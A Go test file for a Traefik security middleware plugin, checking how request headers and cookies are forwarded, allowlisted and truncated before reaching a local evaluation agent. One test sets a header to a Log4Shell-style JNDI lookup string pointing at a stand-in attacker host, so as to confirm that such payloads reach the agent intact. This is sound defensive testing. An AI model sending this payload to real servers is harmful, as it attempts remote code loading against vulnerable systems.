package sokol_traefik_plugin

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"reflect"
	"strings"
	"testing"
)

func serveForwarding(t *testing.T, config *Config, fixture *agentFixture, request *http.Request) evaluationRequest {
	t.Helper()
	handler := newMiddleware(t, config, http.HandlerFunc(func(writer http.ResponseWriter, _ *http.Request) {
		writer.WriteHeader(http.StatusNoContent)
	}))
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	if response.Code != http.StatusNoContent {
		t.Fatalf("status = %d", response.Code)
	}
	return <-fixture.inputs
}

func TestDefaultForwardsAllHeadersAndCookies(t *testing.T) {
	fixture := newAgentFixture(t)
	request := httptest.NewRequest("POST", "https://example.test/login", strings.NewReader("a=b"))
	request.RemoteAddr = "10.0.0.5:1234"
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Set("User-Agent", "forward-test")
	request.Header.Set("Referer", "https://example.test/")
	request.Header.Set("Authorization", "Bearer forwarded-to-local-agent")
	request.Header.Set("X-Api-Version", "${jndi:ldap://attacker.test/a}")
	request.Header.Add("X-Multi", "one")
	request.Header.Add("X-Multi", "two")
	request.AddCookie(&http.Cookie{Name: "__Host-sokol_trust", Value: "trust"})
	request.AddCookie(&http.Cookie{Name: "session", Value: "abc"})

	input := serveForwarding(t, testConfig(t, fixture), fixture, request)
	for key, want := range map[string]string{
		"user-agent":     "forward-test",
		"referer":        "https://example.test/",
		"authorization":  "Bearer forwarded-to-local-agent",
		"x-api-version":  "${jndi:ldap://attacker.test/a}",
		"x-multi":        "one, two",
		"content-length": "3",
	} {
		if input.Headers[key] != want {
			t.Fatalf("header %s = %q, want %q (all: %#v)", key, input.Headers[key], want, input.Headers)
		}
	}
	if _, present := input.Headers["cookie"]; present {
		t.Fatal("raw Cookie header must be forwarded only as parsed cookies")
	}
	if input.Cookies["__Host-sokol_trust"] != "trust" || input.Cookies["session"] != "abc" {
		t.Fatalf("cookies = %#v", input.Cookies)
	}
	if input.HeaderMode != "all" || input.CookieMode != "all" ||
		input.HeadersTruncated || input.CookiesTruncated {
		t.Fatalf("forwarding metadata = %#v", input)
	}
	wantHeaders := make([]string, 0, len(legacyDefaultHeaders))
	for _, header := range legacyDefaultHeaders {
		wantHeaders = append(wantHeaders, strings.ToLower(header))
	}
	if !reflect.DeepEqual(input.AllowlistedHeaders, wantHeaders) ||
		!reflect.DeepEqual(input.AllowlistedCookies, []string{"__Host-sokol_trust"}) {
		t.Fatalf("allowlisted = %#v / %#v", input.AllowlistedHeaders, input.AllowlistedCookies)
	}
	if len(input.Body) != 0 {
		t.Fatal("request body was captured although body inspection is opt-in")
	}
}

func TestHeaderAndCookieModesAreIndependent(t *testing.T) {
	fixture := newAgentFixture(t)
	config := testConfig(t, fixture)
	config.Request.HeaderMode = "allowlist"
	config.Request.Headers = []string{"User-Agent", "Referer"}
	request := httptest.NewRequest("GET", "https://example.test/", nil)
	request.RemoteAddr = "10.0.0.5:1234"
	request.Header.Set("User-Agent", "ua")
	request.Header.Set("Referer", "https://example.test/")
	request.Header.Set("X-Custom", "not forwarded")
	request.AddCookie(&http.Cookie{Name: "session", Value: "abc"})

	input := serveForwarding(t, config, fixture, request)
	if !reflect.DeepEqual(input.Headers, map[string]string{"user-agent": "ua", "referer": "https://example.test/"}) {
		t.Fatalf("headers = %#v", input.Headers)
	}
	if input.HeaderMode != "" || len(input.AllowlistedHeaders) != 0 {
		t.Fatalf("allowlist header mode advertised as all: %#v", input)
	}
	if input.CookieMode != "all" || input.Cookies["session"] != "abc" {
		t.Fatalf("cookie forwarding = %q %#v", input.CookieMode, input.Cookies)
	}
}

func TestOversizedHeadersAndCookiesAreTruncatedDeterministically(t *testing.T) {
	fixture := newAgentFixture(t)
	request := httptest.NewRequest("GET", "https://example.test/", nil)
	request.RemoteAddr = "10.0.0.5:1234"
	request.Header.Set("User-Agent", "kept-first")
	request.Header.Set("X-Long", strings.Repeat("a", maximumForwardedValueBytes+10))
	for index := 0; index < maximumForwardedHeaders+40; index++ {
		request.Header.Set(fmt.Sprintf("X-Extra-%03d", index), "v")
	}
	var cookies []string
	for index := 0; index < maximumForwardedCookies+40; index++ {
		cookies = append(cookies, fmt.Sprintf("c%03d=v", index))
	}
	cookies = append(cookies, "__Host-sokol_trust=trust", "c000=duplicate")
	request.Header.Set("Cookie", strings.Join(cookies, "; "))

	input := serveForwarding(t, testConfig(t, fixture), fixture, request)
	if !input.HeadersTruncated || !input.CookiesTruncated {
		t.Fatalf("truncation flags = %t/%t", input.HeadersTruncated, input.CookiesTruncated)
	}
	if len(input.Headers) > maximumForwardedHeaders || len(input.Cookies) > maximumForwardedCookies {
		t.Fatalf("forwarded %d headers and %d cookies", len(input.Headers), len(input.Cookies))
	}
	if input.Headers["user-agent"] != "kept-first" || input.Cookies["__Host-sokol_trust"] != "trust" {
		t.Fatal("allowlisted values must survive truncation")
	}
	if input.Cookies["c000"] != "v" {
		t.Fatalf("duplicate cookie replaced the first value: %q", input.Cookies["c000"])
	}
	if _, present := input.Headers["x-extra-000"]; !present {
		t.Fatal("sorted remainder must be kept before later names")
	}
	if value, present := input.Headers["x-long"]; present && len(value) != maximumForwardedValueBytes {
		t.Fatalf("long value length = %d", len(value))
	}

	again := serveForwarding(t, testConfig(t, fixture), fixture, request)
	if !reflect.DeepEqual(input.Headers, again.Headers) || !reflect.DeepEqual(input.Cookies, again.Cookies) {
		t.Fatal("truncation is not deterministic")
	}
}

func TestForwardedHeaderBytesAreBounded(t *testing.T) {
	policy := newForwardingPolicy(CreateConfig().Request)
	request := httptest.NewRequest("GET", "https://example.test/", nil)
	for index := 0; index < 40; index++ {
		request.Header.Set(fmt.Sprintf("X-Big-%02d", index), strings.Repeat("b", maximumForwardedValueBytes))
	}
	headers, truncated := policy.forwardedHeaders(request)
	total := 0
	for key, value := range headers {
		total += len(key) + len(value)
	}
	if !truncated || total > maximumForwardedHeaderBytes {
		t.Fatalf("truncated=%t total=%d", truncated, total)
	}
}
